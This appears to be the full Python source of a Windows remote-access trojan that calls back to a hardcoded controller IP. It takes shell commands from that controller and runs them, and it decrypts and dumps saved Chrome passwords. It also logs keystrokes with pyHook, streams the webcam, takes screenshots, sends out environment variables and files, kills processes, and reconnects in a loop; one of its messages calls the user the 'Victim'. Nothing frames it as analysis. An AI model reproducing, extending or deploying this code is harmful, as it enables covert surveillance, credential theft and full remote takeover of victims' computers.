from __future__ import print_function
from shutil import copyfile
from PIL import ImageGrab
from os import getenv  
import sqlite3, win32crypt, socket, subprocess, os, tempfile 
import shutil, threading, win32api, pythoncom, random         
import numpy, sys, pyHook, shutil, cv2, time, ctypes

ImagePath = tempfile.mkdtemp()
keyLog = tempfile.mkdtemp()
f_name = keyLog+"\log.txt"
ip_address = '192.168.10.12'

def lockScreen():
    ctypes.windll.user32.LockWorkStation()


def get_chrome_path(s):
    try:
        path = getenv("LOCALAPPDATA")  + "\Google\Chrome\User Data\Default\Login Data"
        path2 = getenv("LOCALAPPDATA")  + "\Google\Chrome\User Data\Default\Login2"
        copyfile(path, path2)

        conn = sqlite3.connect(path2)
        cursor = conn.cursor() 
        cursor.execute('SELECT action_url, username_value, password_value FROM logins')
        
        chromeDump = tempfile.mkdtemp()
        with open(chromeDump+'\ChromeDump.txt', 'w+') as f:
            for raw in cursor.fetchall():
                print('URL: '+raw[0] + '\n' + 'Username: '+raw[1] , file=f)
                password = win32crypt.CryptUnprotectData(raw[2])[1] 
                print('Password: '+password, file=f)
                print('\n', file=f)
            
        conn.close()
        os.remove(path2)
        return chromeDump, True
    except:
        return "Chrome Doesn't exists", False

def recWebCam():
    try:
        cap = cv2.VideoCapture(1) #Capture from webcam       
        while True:
            ret, frame = cap.read() #get image from frame
            _, imgencode = cv2.imencode(".jpg", frame) #encode image into memory buffer
            data = numpy.array(imgencode) #create numpy array from image encoding
            stringData = data.tostring() #convert numpy array to string
            soc = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            soc.connect((ip_address, 9900))
            soc.sendall(stringData)
            soc.close()
    except:
        cap = cv2.VideoCapture(0) #Capture from webcam
        while True:
            ret, frame = cap.read() #get image from frame
            _, imgencode = cv2.imencode(".jpg", frame) #encode image into memory buffer
            data = numpy.array(imgencode) #create numpy array from image encoding
            stringData = data.tostring() #convert numpy array to string
            soc = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            soc.connect((ip_address, 9900))
            soc.sendall(stringData)
            soc.close()
        
def keypressed(event):
    global data
    if event.Ascii == 13:
            keys = '\n'
            fp = open(f_name,'a')
            data = keys            
            fp.write(data)
            fp.close()
    elif event.Ascii == 8:
            keys = ' <BS> '
            fp = open(f_name,'a')
            data = keys            
            fp.write(data)
            fp.close()
    elif event.Ascii == 9:
            keys = ' \t '
            fp = open(f_name,'a')
            data = keys
            fp.write(data)
            fp.close()
    elif event.Ascii == 27:
            keys = ' <ESC> '
            fp = open(f_name,'a')
            data = keys
            fp.write(data + "\n")
            fp.close()
    elif event.Ascii == 1 or event.Ascii == 3 or event.Ascii == 19 or event.Ascii == 0 or event.Ascii == 24:
            pass
    else:
            keys = chr(event.Ascii)
            fp = open(f_name,'a')
            data = keys
            fp.write(data)
            fp.close()

def environment():
    resp = ''
    for n in os.environ:
        resp += "{0:35}: {1}\n".format(n,os.environ.get(n))
    resp = resp.replace(';','\n{0:39}: '.format(""))
    return resp

def startLogger():
    global obj
    obj = pyHook.HookManager()
    obj.KeyDown = keypressed
    obj.HookKeyboard()
    pythoncom.PumpMessages()
    
def stopLogger():
        obj.UnhookKeyboard()
    
def transfer(s,path,command):
    if os.path.exists(path):
        f = open(path, 'rb')
        packet = f.read(1024*1024)#1MB
        while packet != '':
            s.send(packet) 
            packet = f.read(1024*1024)
        if 'grab' in command:
            s.send('DONE')
        elif 'screencap' in command:
            s.send('captured')
        elif 'getLogFile' in command:
            s.send('LogSent')
        elif 'chromeDump' in command:
            s.send('DumpSent')
        f.close()
    else: # the file doesn't exist
        s.send('Unable to find out the file')

def getKeyLogFile(s, path):
    transfer(s,path)

def connect():
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((ip_address, 8080))
 
    while True: 
        command =  s.recv(1024*1024)
        
        if 'kill' in command:
            command = command.split(' ')
            command = 'Taskkill /IM '+command[1]+' /F'
            CMD =  subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
        elif 'terminate' in command:
           return 1
        elif 'grab' in command:            
            grab,path = command.split(' ')
            try:
                transfer(s,path,command)
            except Exception,e:
                s.send ( str(e) )  
                pass
        elif 'screencap' in command:
            try:
                dirpath = tempfile.mkdtemp()
                ImageGrab.grab().save(dirpath+"\img.jpg", "JPEG")
                transfer(s, dirpath+"\img.jpg", command)
                shutil.rmtree(dirpath)
            except Exception, e:
                s.send(str(e))
                pass
        elif 'startLogger' in command:
            logging = threading.Thread(target=startLogger)
            logging.start()
            s.send('[+] Keylogger started')
        elif 'activateWebcam' in command:
            webcam = threading.Thread(target=recWebCam)
            webcam.start()
        elif 'stopLogger' in command:
            stopLogger()
            s.send('[+] Keylogger stopped')
        elif 'about' in command:
            response = environment()
            s.send(response)
        elif 'getLogFile' in command:
            transfer(s, f_name, command)
            shutil.rmtree(keyLog)
        elif 'askPass' in command:
            askPass(s)
        elif 'chromeDump' in command:
            path, success = get_chrome_path(s)
            if success:
                transfer(s, path+"\ChromeDump.txt", command)
                shutil.rmtree(path)
            else:
                s.send("[!] Chrome Doesn't exists")
        elif 'lockScreen' in command:
            lockScreen()
            s.send( "[+] Victim Screen Lock")
        elif 'cd' in command:
            code,directory = command.split (' ')
            os.chdir(directory)
            s.send( "[+] CWD Is " + os.getcwd() )
        else:
            CMD =  subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
            s.send( CMD.stdout.read()  ) 
            s.send( CMD.stderr.read()  ) 

def main ():
    while True:
        try:
            if connect() == 1:
                break
        except:
            sleep_for = random.randrange(1, 10)
            time.sleep(sleep_for)   
            pass

if __name__ == "__main__":
    main()
